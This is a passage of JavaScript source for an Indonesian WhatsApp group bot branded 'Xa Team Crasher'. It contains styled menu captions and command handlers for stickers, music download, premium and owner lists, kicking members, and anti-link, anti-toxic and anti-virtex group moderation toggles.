│ 员 𝑼𝒔𝒆𝒓𝒏𝒂𝒎𝒆 : ${pushname}
│ 员 𝑼𝒔𝒆𝒓 𝑵𝒖𝒎𝒃𝒆𝒓 : ${m.sender.split("@")[0]}
┆ 员 𝑩𝒐𝒕 𝑵𝒂𝒎𝒆 : 𝐗𝐚 𝐓𝐞𝐚𝐦 𝐕𝟏𝟎
┆ 员 𝑽𝒆𝒓𝒔𝒊𝒐𝒏 : 𝟏𝟎.𝟎.𝟎
┆ 员 𝑴𝒐𝒅𝒆 𝑩𝒐𝒕 : ${client.public ? "Public" : "Self"}

发 \`𝗙𝘂𝗻 𝗠𝗲𝗻𝘂\` 发
│.𝗖𝗲𝗸𝗖𝗮𝗻𝘁𝗶𝗸
│.𝗖𝗲𝗸𝗞𝗼𝗱𝗮𝗺
│.𝗖𝗲𝗸𝗗𝗼𝗻𝗴𝗼
│.𝗞𝗶𝘀𝗮𝗵𝗡𝗮𝗯𝗶
│.𝗠𝘂𝘀𝗹𝗶𝗺𝗔𝗶
│.𝗔𝗻𝗶𝗺𝗲𝗡𝗲𝗸𝗼
│.𝗔𝗻𝗶𝗺𝗲𝗣𝗮𝘁
│.𝗔𝗻𝗶𝗺𝗲𝗦𝗹𝗮𝗽
│.𝗔𝗻𝗶𝗺𝗲𝗖𝘂𝗱𝗱𝗹𝗲
│.𝗤𝘂𝗲𝘁𝗲𝘀𝗛𝗮𝗰𝗸𝗲𝗿
│.𝗤𝘂𝗲𝘁𝗲𝘀𝗚𝗼𝗺𝗯𝗮𝗹
│.𝗤𝘂𝗲𝘁𝗲𝘀𝗚𝗮𝗹𝗮𝘂
│.𝗤𝘂𝗲𝘁𝗲𝘀𝗠𝗼𝘁𝗶𝘃𝗮𝘀𝗶

© 𝖷𝖺 𝖳𝖾𝖺𝗆 𝖨𝗌 𝖧𝖾𝗋𝖾 🩸
 `
client.sendMessage(m.chat, {
        image: { url: `${global.thumb}` },
	    caption: caption,
        contextInfo: {
          externalAdReply: {
            showAdAttribution: true,
             title: `𝐗𝐚⃢ 𝐓𝐞𝐚͢𝐦 𝐂𝐫𝐚͢𝐬𝐡𝐞𝐫⃤`,
              body: `© 𝗫𝗵𝗮𝗺𝘇`,
             thumbnailUrl: `${global.thumb2}`,
            sourceUrl: `https://whatsapp.com/channel/0029Vb9vV0m59PwJE7Qm3d19`,
           mediaType: 1,
          renderLargerThumbnail: true
         }
        },
      buttons: [
        { buttonId: ".menu", buttonText: { displayText: "𝕭𝖆𝖈𝖐 𝕸𝖊𝖓𝖚" }, type: 1 }
      ], 
      viewOnce: true,
            headerType: 1
        }, { quoted: qchannel });
}
break;

case "ownermenu": {
const caption = ` 
hallo👋 ${pushname} Saya Bot Yang Bernama 𝐗𝐚 𝐓𝐞𝐚𝐦 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 Yang Dirancang Khusus! 

╭━━「 \`𝗨𝘀𝗲𝗿 𝗜𝗻𝗳𝗼\`
│ 员 𝑼𝒔𝒆𝒓𝒏𝒂𝒎𝒆 : ${pushname}
│ 员 𝑼𝒔𝒆𝒓 𝑵𝒖𝒎𝒃𝒆𝒓 : ${m.sender.split("@")[0]}
┆ 员 𝑩𝒐𝒕 𝑵𝒂𝒎𝒆 : 𝐗𝐚 𝐓𝐞𝐚𝐦 𝐕𝟏𝟎
┆ 员 𝑽𝒆𝒓𝒔𝒊𝒐𝒏 : 𝟏𝟎.𝟎.𝟎
┆ 员 𝑴𝒐𝒅𝒆 𝑩𝒐𝒕 : ${client.public ? "Public" : "Self"}

发 \`𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂\` 发
│.𝗔𝗱𝗱𝗣𝗿𝗲𝗺 𝟼𝟸𝟾𝚡𝚡𝚡
│.𝗗𝗲𝗹𝗣𝗿𝗲𝗺 𝟼𝟸𝟾𝚡𝚡𝚡
│.𝗔𝗱𝗱𝗢𝘄𝗻𝗲𝗿 𝟼𝟸𝟾𝚡𝚡𝚡
│.𝗗𝗲𝗹𝗢𝘄𝗻𝗲𝗿 𝟼𝟸𝟾𝚡𝚡𝚡
│.𝗣𝘂𝗯𝗹𝗶𝗰
│.𝗦𝗲𝗹𝗳

© 𝖷𝖺 𝖳𝖾𝖺𝗆 𝖨𝗌 𝖧𝖾𝗋𝖾🩸
 `
client.sendMessage(m.chat, {
        image: { url: `${global.thumb}` },
	    caption: caption,
        contextInfo: {
          externalAdReply: {
            showAdAttribution: true,
             title: `𝐗𝐚⃢ 𝐓𝐞𝐚͢𝐦 𝐂𝐫𝐚͢𝐬𝐡𝐞𝐫⃤`,
              body: `© 𝗫𝗵𝗮𝗺𝘇`,
             thumbnailUrl: `${global.thumb2}`,
            sourceUrl: `https://whatsapp.com/channel/0029Vb9vV0m59PwJE7Qm3d19`,
           mediaType: 1,
          renderLargerThumbnail: true
         }
        },
      buttons: [
        { buttonId: ".menu", buttonText: { displayText: "𝕭𝖆𝖈𝖐 𝕸𝖊𝖓𝖚" }, type: 1 }
      ], 
      viewOnce: true,
            headerType: 1
        }, { quoted: qchannel });
}

break;
case "groupmenu": {
const caption = ` 
hallo👋 ${pushname} Saya Bot Yang Bernama 𝐗𝐚 𝐓𝐞𝐚𝐦 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 Yang Dirancang Khusus! 

╭━━「 \`𝗨𝘀𝗲𝗿 𝗜𝗻𝗳𝗼\`
│ 员 𝑼𝒔𝒆𝒓𝒏𝒂𝒎𝒆 : ${pushname}
│ 员 𝑼𝒔𝒆𝒓 𝑵𝒖𝒎𝒃𝒆𝒓 : ${m.sender.split("@")[0]}
┆ 员 𝑩𝒐𝒕 𝑵𝒂𝒎𝒆 : 𝐗𝐚 𝐓𝐞𝐚𝐦 𝐕𝟏𝟎
┆ 员 𝑽𝒆𝒓𝒔𝒊𝒐𝒏 : 𝟏𝟎.𝟎.𝟎
┆ 员 𝑴𝒐𝒅𝒆 𝑩𝒐𝒕 : ${client.public ? "Public" : "Self"}
  
发 \`𝗚𝗿𝗼𝘂𝗽 𝗠𝗲𝗻𝘂\` 发
│.𝗔𝗱𝗱𝗕𝗮𝗱𝘄𝗼𝗿𝗱𝘀
│.𝗗𝗲𝗹𝗕𝗮𝗱𝘄𝗼𝗿𝘀
│.𝗔𝗻𝘁𝗶𝗟𝗶𝗻𝗸𝗔𝗹𝗹
│.𝗔𝗻𝘁𝗶𝗧𝗼𝘅𝗶𝗰
│.𝗔𝗻𝘁𝗶𝗪𝗮𝗺𝗲
│.𝗔𝗻𝘁𝗶𝗔𝘀𝗶𝗻𝗴
│.𝗔𝗻𝘁𝗶𝗩𝗶𝗿𝘂𝘀
│.𝗛𝗶𝗱𝗲𝘁𝗮𝗴
│.𝗢𝗽𝗲𝗻
│.𝗖𝗹𝗼𝘀𝗲
│.𝗞𝗶𝗰𝗸 [ @ ]
│.𝗔𝗻𝘁𝗶𝗧𝗮𝗴𝗚𝗿𝗼𝘂𝗽

© 𝖷𝖺 𝖳𝖾𝖺𝗆 𝖨𝗌 𝖧𝖾𝗋𝖾🩸
 `;
client.sendMessage(m.chat, {
        image: { url: `${global.thumb}` },
	    caption: caption,
        contextInfo: {
          externalAdReply: {
            showAdAttribution: true,
             title: `𝐗𝐚⃢ 𝐓𝐞𝐚͢𝐦 𝐂𝐫𝐚͢𝐬𝐡𝐞𝐫⃤`,
              body: `© 𝗫𝗵𝗮𝗺𝘇`,
             thumbnailUrl: `${global.thumb2}`,
            sourceUrl: `https://whatsapp.com/channel/0029Vb9vV0m59PwJE7Qm3d19`,
           mediaType: 1,
          renderLargerThumbnail: true
         }
        },
      buttons: [
        { buttonId: ".menu", buttonText: { displayText: "𝕭𝖆𝖈𝖐 𝕸𝖊𝖓𝖚" }, type: 1 }
      ], 
      viewOnce: true,
            headerType: 1
        }, { quoted: qchannel });
}
break;
case "sticker": case "stiker": case "sgif": case "s": {
if (!/image|video/.test(mime)) return m.reply(example("𝗙𝗼𝘁𝗼/𝗩𝗶𝗱𝗲𝗼 𝗡𝘆𝗮 𝗠𝗮𝗻𝗮 𝗕𝗮𝗻𝗴?"))
if (/video/.test(mime)) {
if ((qmsg).seconds > 15) return m.reply("𝗠𝗶𝗻𝗶𝗺𝗮𝗹 𝗠𝗮𝗸𝘀𝗶𝗺𝗮𝗹 𝟭𝟱 𝗗𝗲𝘁𝗶𝗸")
}
m.reply(msg.wait)
var media = await client.downloadAndSaveMediaMessage(qmsg)
await client.sendStimg(m.chat, media, m, {packname: `${global.packname}`})
await fs.unlinkSync(media)
}
break
case 'hd': case 'remini': {
if (!/image/.test(mime)) return m.reply("𝗙𝗼𝘁𝗼/𝗩𝗶𝗱𝗲𝗼 𝗡𝘆𝗮 𝗠𝗮𝗻𝗮 𝗕𝗮𝗻𝗴?")
let foto = await client.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await client.sendMessage(m.chat, {image: result}, {quoted: qkontak})
await fs.unlinkSync(foto)
}
break
case 'brat': {
  if (!text) return m.reply("𝗧𝗲𝗸𝘀 𝗡𝘆𝗮 𝗠𝗮𝗻𝗮 𝗕𝗮𝗻𝗴?");

  async function brat(text) {
    try {
      const axios = require('axios');
      const res = await axios.get("https://brat.caliphdev.com/api/brat", {
        params: { text },
        responseType: "arraybuffer"
      });
      const image = Buffer.from(res.data);
      if (image.length <= 10240) throw new Error("Gagal generate brat");
      return image;
    } catch (e) {
      throw new Error(e.message || "Error tidak dikenal");
    }
  }

  try {
    const buf = await brat(text);
    const { writeFile } = require("fs/promises");
    const { Sticker } = require("wa-sticker-formatter");
    const tempFile = "./temp-brat.png";

    await writeFile(tempFile, buf);

    const sticker = new Sticker(tempFile, {
      pack: global.footer,
      author: "Xa Team - 𝗛𝗮𝗺𝘇 𝗗𝗲𝘃",
      type: "full",
      categories: ['😎'],
    });

    await client.sendMessage(m.chat, await sticker.toMessage());
  } catch (e) {
    m.reply(`Error: ${e.message}`);
  }
}
break
case 'tqto': {
reply(`

╭─▧ 𝙏𝙝𝙖𝙣𝙠𝙨 𝙏𝙤 :
│ ʜᴀᴍᴢ  [ ᴄʀᴇᴀᴛᴏʀ ]
│ ᴀʟᴅᴢ   [ sᴜᴘᴘᴏʀᴛ ]
│ ᴋᴀɪᴢɪ  [ ғʀɪᴇɴᴅ ]
│ ᴊᴏᴄʟᴏᴜᴅ   [ ғʀɪᴇɴᴅ ]
│ ᴛᴀᴍᴀ [ ғʀɪᴇɴᴅ ]
│ ᴀɪᴍᴀ  [ ғʀɪᴇɴᴅ ]
│ ᴋᴀʏᴢᴇɴ  [ ғʀɪᴇɴᴅ ]
│ ᴊᴜsᴛɪɴ  [ ғʀɪᴇɴᴅ ]
│ ᴠᴀᴍᴘɪʀᴇ [ ғʀɪᴇɴᴅ ]
│ xᴀᴛᴀɴɪᴄ  [ ғʀɪᴇɴᴅ ]
│ ʀᴀᴘɪᴘ  [ ғʀɪᴇɴᴅ ]
│ ʟᴀɴɢɪᴛ [ ғʀɪᴇɴᴅ ]
│ ᴅᴀғғᴀ  [ ғʀɪᴇɴᴅ ]
│ ᴋʏᴀᴍɪ  [ ғʀɪᴇɴᴅ ]
│ ᴋʏᴜᴜʀᴢʏ  [ ғʀɪᴇɴᴅ ]
│ ᴍᴀɴᴢxxʏ  [ ғʀɪᴇɴᴅ ]
│ ʀᴀᴘʟʏ  [ ғʀɪᴇɴᴅ ]
│ ʏᴜᴋᴇᴇʏ   [ ғʀɪᴇɴᴅ ]
│ ᴀʟᴘɪɴ   [ ғʀɪᴇɴᴅ ]
│ ᴘᴇʀᴍᴇɴ   [ ғʀɪᴇɴᴅ ]
│ sʏʀᴏ   [ ғʀɪᴇɴᴅ ]
│ ʀɪᴋʏᴅᴄᴏᴅᴇʀs  [ ғʀɪᴇɴᴅ ]
│ ᴋɪɴɢ ʀʏᴜ   [ ғʀɪᴇɴᴅ ]
│ ᴅʀᴀʏxᴅ   [ ғʀɪᴇɴᴅ ]
│ ʀɪʟʏᴢʏ   [ ғʀɪᴇɴᴅ ]
│ ɪᴋʏᴢ   [ ғʀɪᴇɴᴅ ]
│ ʜᴀᴢᴀᴢᴇʟ   [ ғʀɪᴇɴᴅ ]
│ ᴇʀʟᴀɴɢɢᴀ   [ ғʀɪᴇɴᴅ ]
│ ᴘᴇᴛʀᴀ   [ ғʀɪᴇɴᴅ ]
│ ɴᴀʙᴢx   [ ғʀɪᴇɴᴅ ]
│ ᴘᴜᴛʀᴀ   [ ғʀɪᴇɴᴅ ]
╰ ─────────────

© Xa Team Is Here 🩸`) 
}
break
case 'owner': case 'botowner':
let namaown = `${namaowner}`
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `${namaowner}`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaowner}\nitem1.TEL;waid=${global.owner}:+${global.owner}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:${namaowner}\nX-WA-BIZ-NAME: ${namaowner}\nEND:VCARD`,
}
}), { userJid: m.chat, quoted: qkontak })
client.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
break
case "hidetag": case "z": case "h": {
if (!isDev && !isOwner) return reply("𝗬𝗼𝘂 𝗡𝗼𝘁 𝗢𝘄𝗻𝗲𝗿")
if (!m.isAdmin && !isOwner) return m.reply(msg.admin)
if (!m.quoted && !text) return m.reply(example("teksnya/replyteks"))
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
client.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
case 'antitaggrup': {
    if (!m.isGroup) return reply("Grup Only")
    if (!isPremium && !isOwner) return client.sendMessage(from, {audio: fs.readFileSync('./media/vn/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
    if (m.message?.groupStatusMentionMessage) {
        reply(`[ ! ] 𝗡𝗮𝗷𝗶𝘀 𝗖𝗮𝗽𝗲𝗿 𝗕𝗴𝘁 𝗧𝗮𝗴 𝗚𝗿𝗼𝘂𝗽 𝗞𝗼𝗻𝘁𝗼𝗹`)
        await client.sendMessage(m.chat, { delete: m.key })
    }
    return true
}
break
case "play": {
if (!text) return m.reply(example("dj tiktok"))
await client.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await fetchJson("https://api.skyzopedia.us.kg/api/download/ytmp3?url="+res.url)

if (anu.download.audio) {
let urlMp3 = anu.download.audio
await client.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: res.thumbnail, title: res.title, body: `Author ${res.author.name} || Duration ${res.timestamp}`, sourceUrl: res.url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
await client.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

case 'addbadwords': {
if (!m.isGroup) return reply(`Khusus Grub Geblek`)
if (!m.isBotAdmin) return reply('Bot Bukan Admin Geblek')
if (!m.isAdmin && !isOwner) return reply('Khusus Admin Sayaaaang ><')
if (!text) return reply(`Penggunaan ${prefix+command} anjing`)
badwords.push(text)
fs.writeFileSync('./database/badwords.json',JSON.stringify(badwords))
reply(`Kata kasar "${text}" berhasil ditambahkan.`)
}
break

case 'deletebadwords': case 'delbadwords': {
if (!m.isGroup) return reply(`Khusus Grub Geblek`)
if (!m.isBotAdmin) return reply('Bot Bukan Admin Geblek')
if (!m.isAdmin && !isOwner) return reply('Khusus Admin Sayaaaang ><')
if (!text) return reply(`Penggunaan ${prefix+command} anjing`)
let unp = badwords.indexOf(text)
badwords.splice(unp, 1)
fs.writeFileSync('./database/badwords.json',JSON.stringify(badwords))
reply(`Kata kasar "${text}" berhasil dihapus.`)
}
break
case 'antilinkall': {
if (!m.isGroup) return reply(`Khusus Grub Geblek`)
if (!m.isBotAdmin) return reply('Bot Bukan Admin Geblek')
if (!m.isAdmin && !isOwner) return reply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkAll) return reply('_Sudah Diaktifkan_')
ntilinkall.push(m.chat)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await client.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
client.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim link apapun di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:qchannel})
} else if (args[0] === "off") {
if (!AntiLinkAll) return reply('_Sudah Dimatikan_')
let off = ntilinkall.indexOf(m.chat)
ntilinkall.splice(off, 1)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
case 'antitoxic': {
if (!m.isGroup) return reply(`Khusus Grub Geblek`)
if (!m.isBotAdmin) return reply('Bot Bukan Admin Geblek')
if (!m.isAdmin && !isOwner) return reply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiToxic) return reply('_Sudah Diaktifkan_')
nttoxic.push(m.chat)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await client.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
client.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\n𝗔𝘀𝘁𝗮𝗴𝗳𝗶𝗿𝘂𝗹𝗹𝗮𝗵... 𝗱𝗶 𝗴𝗿𝗼𝘂𝗽 𝗶𝗻𝗶 𝘁𝗶𝗱𝗮𝗸 𝗱𝗶𝗽𝗲𝗿𝗯𝗼𝗹𝗲𝗵𝗸𝗮𝗻 𝗺𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗸𝗮𝗻 𝗸𝗮𝘁𝗮 𝗸𝗮𝘀𝗮𝗿! 𝗝𝗶𝗸𝗮 𝗸𝗲𝘁𝗮𝗵𝘂𝗮𝗻 𝗮𝗸𝗮𝗻 𝗱𝗶𝘁𝗲𝗻𝗱𝗮𝗻𝗴`, contextInfo: { mentionedJid : mems }}, {quoted:qchannel})
} else if (args[0] === "off") {
if (!AntiToxic) return reply('_Sudah Dimatikan_')
let off = nttoxic.indexOf(m.chat)
nttoxic.splice(off, 1)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case "antiasing":{
if (!m.isGroup) return reply(`Khusus Grub Geblek`)
if (!m.isBotAdmin) return reply('Bot Bukan Admin Geblek')
if (!m.isAdmin && !isOwner) return reply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiAsing) return reply('_Sudah Diaktifkan_')
ntasing.push(m.chat)
fs.writeFileSync('./database/antiasing.json', JSON.stringify(ntasing))
reply(`_Sukses aktifkan ${command} di group ini_`)
} else if (args[0] === "off") {
if (!AntiAsing) return reply('_Sudah Dimatikan_')
let off = ntasing.indexOf(m.chat)
ntasing.splice(off, 1)
fs.writeFileSync('./database/antiasing.json', JSON.stringify(ntasing))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
case 'antiwame': {
if (!m.isGroup) return reply(`Khusus Grub Geblek`)
if (!m.isBotAdmin) return reply('Bot Bukan Admin Geblek')
if (!m.isAdmin && !isOwner) return reply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiWame) return reply('_Sudah Diaktifkan_')
ntwame.push(m.chat)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await client.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
client.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nTidak ada yang boleh mengirim wa.me di grup ini, siapa yang mengirim akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:qchannel})
} else if (args[0] === "off") {
if (!AntiWame) return reply('_Sudah Dimatikan_')
let off = ntwame.indexOf(m.chat)
ntwame.splice(off, 1)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
case 'antivirus': case 'antivirtex': {
if (!m.isGroup) return reply(`Khusus Grub Geblek`)
if (!m.isBotAdmin) return reply('Bot Bukan Admin Geblek')
if (!m.isAdmin && !isOwner) return reply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiVirtex) return reply('_Sudah Diaktifkan_')
ntvirtex.push(m.chat)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await client.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
client.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nTidak ada orang yang diperbolehkan mengirim virus di grup ini, anggota yang mengirim akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:qchannel})
} else if (args[0] === "off") {
if (!AntiVirtex) return reply('_Sudah Dimatikan_')
let off = ntvirtex.indexOf(m.chat)
ntvirtex.splice(off, 1)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
case "kik": case "kick": {
if (!m.isGroup) return m.reply(msg.group)
if (!m.isBotAdmin) return m.reply(msg.adminbot)
if (!m.isAdmin && !isOwner) return m.reply(msg.admin)
if (text || m.quoted) {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await client.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => client.sendMessage(m.chat, {text: `Berhasil Mengeluarkan @${users.split("@")[0]} Dari Grup Ini`, mentions: [`${users}`]}, {quoted: m})).catch((err) => m.reply(err.toString()))
} else return m.reply(example('nomornya/@tag'))}
break
case "delprem":{
if (!isOwner && !isDev) return reply("𝗬𝗼𝘂 𝗡𝗼𝘁 𝗢𝘄𝗻𝗲𝗿")
if (!args[0]) return m.reply(`Example Use :\n${prefix+command} 62xxx`)
let ya = q.split("|")[0].replace(/[^0-9]/g, '')
let no = '@s.whatsapp.net'
let unp = Premium.indexOf(ya)
Premium.splice(unp, 1)
fs.writeFileSync("./database/premium.json", JSON.stringify(Premium))
m.reply(`Sussces Del Prem ${ya}`)
}
break
case "addprem":{
if (!isOwner && !isDev) return reply("𝗬𝗼𝘂 𝗡𝗼𝘁 𝗢𝘄𝗻𝗲𝗿")
if (!args[0]) return m.reply(`*\`PENGGUNA :\`* *${command} NOMOR*\n*\`EXAMPLE :\`* *${command} 628XXXX*`)
let prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await client.onWhatsApp(prrkek)
if (ceknya.length == 0) return m.reply(`*\`MOHON MASUKAN NOMOR YG TERDAFTAR\`*`)
Premium.push(prrkek)
fs.writeFileSync("./database/premium.json", JSON.stringify(Premium))
m.reply(`*\`𝗦𝘂𝗸𝘀𝗲𝘀 𝗠𝗲𝗻𝗷𝗮𝗱𝗶 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗫𝗮 𝗧𝗲𝗮𝗺\`*`)
}
break
case "delowner":{
if (!isDev) return reply("𝗬𝗼𝘂 𝗡𝗼𝘁 𝗗𝗲𝘃")
if (!args[0]) return m.reply(`Example Use :\n${prefix+command} 62xxx`)
let ya = q.split("|")[0].replace(/[^0-9]/g, '')
let no = '@s.whatsapp.net'
let unp = OwnerR.indexOf(ya)
OwnerR.splice(unp, 1)
fs.writeFileSync("./database/owner.json", JSON.stringify(OwnerR))
m.reply(`Sussces Del Owner ${ya}`)
}
break
case "addowner":{
if (!isDev) return reply("𝗬𝗼𝘂 𝗡𝗼𝘁 𝗗𝗲𝘃")
if (!args[0]) return m.reply(`*\`PENGGUNA :\`* *${command} NOMOR*\n*\`EXAMPLE :\`* *${command} 628XXXX*`)
let prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await client.onWhatsApp(prrkek)
if (ceknya.length == 0) return m.reply(`*\`MOHON MASUKAN NOMOR YG TERDAFTAR\`*`)
Premium.push(prrkek)
fs.writeFileSync("./database/owner.json", JSON.stringify(Premium))
m.reply(`*\`SUKSES MENJADI OWNER!!\`*`)
}
break
case "cekidch": case "idch": {
    if (!text) return m.reply(example("linkchnya"))
    if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
    let result = text.split('https://whatsapp.com/channel/')[1]
    try {
        let res = await client.newsletterMetadata("invite", result)
        if (!res) return m.reply("Gagal mengambil metadata")
        let teks = `
*ID :* ${res.id}
*Nama :* ${res.name}
*Total Pengikut :* ${res.subscribers}
*Status :* ${res.state}
*Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
        `
        return m.reply(teks)
    } catch (error) {
        console.error(error);
        return m.reply("Terjadi kesalahan saat mengambil metadata");
    }
}
break
case "open": {
if (!m.isGroup) return m.reply(msg.group)
if (!m.isBotAdmin) return m.reply(msg.adminbot)
if (!m.isAdmin && !isOwner) return m.reply(msg.admin)
await client.groupSettingUpdate(m.chat, 'not_announcement')
m.reply("[ ! ] 𝗕𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗠𝗲𝗺𝗯𝘂𝗸𝗮 𝗚𝗿𝗼𝘂𝗽... 𝗦𝗲𝗹𝘂𝗿𝘂𝗵 𝗦𝘂𝗸𝗶 𝗗𝗶𝗽𝗲𝗿𝗯𝗼𝗹𝗲𝗵𝗸𝗮𝗻 𝗕𝗲𝗿𝗯𝗶𝗰𝗮𝗿𝗮!")
}
break
case "close": {
if (!m.isGroup) return m.reply(msg.group)
if (!m.isBotAdmin) return m.reply(msg.adminbot)
if (!m.isAdmin && !isOwner) return m.reply(msg.admin)
await client.groupSettingUpdate(m.chat, 'announcement')
m.reply("[ ! ] 𝗕𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗠𝗲𝗻𝘂𝘁𝘂𝗽 𝗚𝗿𝗼𝘂𝗽... 𝗦𝗲𝗹𝘂𝗿𝘂𝗵 𝗣𝗮𝗿𝗮 𝗦𝘂𝗸𝗶 𝗧𝗶𝗱𝗮𝗸 𝗗𝗶 𝗣𝗲𝗿𝗯𝗼𝗹𝗲𝗵𝗸𝗮𝗻 𝗕𝗲𝗿𝗯𝗶𝗰𝗮𝗿𝗮")
}
break
case "del": case "delete": {
if (m.isGroup) {
if (!isOwner && !m.isAdmin) return m.reply(msg.admin)
if (!m.quoted) return m.reply("𝗥𝗲𝗽𝗹𝘆 𝗣𝗲𝘀𝗮𝗻 𝗡𝘆𝗮 𝗚𝗼𝗯𝗹𝗼𝗸")
if (m.quoted.sender == botNumber) {
client.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!m.isBotAdmin) return m.reply(msg.adminbot)
client.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isOwner) return reply("𝗬𝗼𝘂 𝗡𝗼𝘁 𝗢𝘄𝗻𝗲𝗿")
if (!m.quoted) return m.reply("Reply Pesan Yang Ingin Di Hapus")
client.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}}
case 'tourl': {
if (!mime) return reply(`𝗞𝗶𝗿𝗶𝗺/𝗥𝗲𝗽𝗹𝘆 𝗩𝗶𝗱𝗲𝗼/𝗚𝗮𝗺𝗯𝗮𝗿 𝗗𝗮𝗻 𝗔𝘂𝗱𝗶𝗼 𝗗𝗲𝗻𝗴𝗮𝗻 𝗖𝗮𝗽𝘁𝗶𝗼𝗻 ${prefix + command}`);
try {
let media = await client.downloadAndSaveMediaMessage(quoted);
if (/image|video|audio/.test(mime)) {
let response = await CatBox(media);
let fileSize = (fs.statSync(media).size / 1024).toFixed(2);
let uploadDate = new Date().toLocaleString();
reply(`> ᴜᴋᴜʀᴀɴ ғɪʟᴇ : ${fileSize} ᴋʙ\n> ᴜʀʟ : ${response}`);
	} else {
            reply(`Maaf, hanya gambar, video, atau audio yang dapat diunggah.`);
        }

        // Menghapus file setelah diunggah
      await fs.unlinkSync(media);
    } catch (err) {
        reply(example("dengan mengirim foto/vidio/audio"));
   }
			}
break
case 'presetam': {
if (!text) return m.reply(`Ex : ${prefix + command} https://alightcreative.com/am/share/u/FttFe29F5Dd3AUOxUIiztaBmABw2/p/sd8WMnsElo-b71f57e092dbe21f?source=link`)
if (!(text.includes('http://') || text.includes('https://'))) return reply(`url invalid, please input a valid url. Try with add http:// or https://`)
 if (!(text.includes('alight.link') || text.includes('alightcreative.com'))) return reply(`Invalid Alight Motion URL.`)
 
